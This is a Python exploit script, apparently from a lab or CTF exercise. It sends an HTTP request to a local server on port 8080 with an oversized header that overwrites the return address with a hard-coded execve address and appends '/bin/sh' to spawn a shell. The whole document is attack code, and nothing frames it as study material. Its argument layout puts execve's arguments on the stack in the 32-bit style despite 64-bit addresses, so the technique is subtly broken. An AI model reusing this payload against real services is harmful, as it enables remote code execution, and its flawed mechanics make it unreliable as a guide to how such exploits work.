#!/usr/bin/env python3
import socket
import struct

host = "localhost"
port = 8080

# Real address of execve from GDB
execve_addr = struct.pack("<Q", 0x7ffff7e7f310)

# Stack address estimate where we will place "/bin/sh"
binsh_ptr = struct.pack("<Q", 0x7fffffffe510)  # adjust if needed

null = struct.pack("<Q", 0x0)

# Build overflow buffer
padding = b"A" * 520  # adjust based on how long it takes to reach return address

payload = padding
payload += execve_addr     # RIP overwrite â†’ execve()
payload += null            # return address after execve
payload += binsh_ptr       # 1st arg: pointer to "/bin/sh"
payload += null            # 2nd arg: argv
payload += null            # 3rd arg: envp
payload += b"/bin/sh\x00"  # inject the actual string too

# Build full HTTP request with payload inside a header
request = b"GET / HTTP/1.0\r\n"
request += b"Exploit: " + payload + b"\r\n"
request += b"\r\n"

# Send request
s = socket.create_connection((host, port))
s.send(request)
s.close()
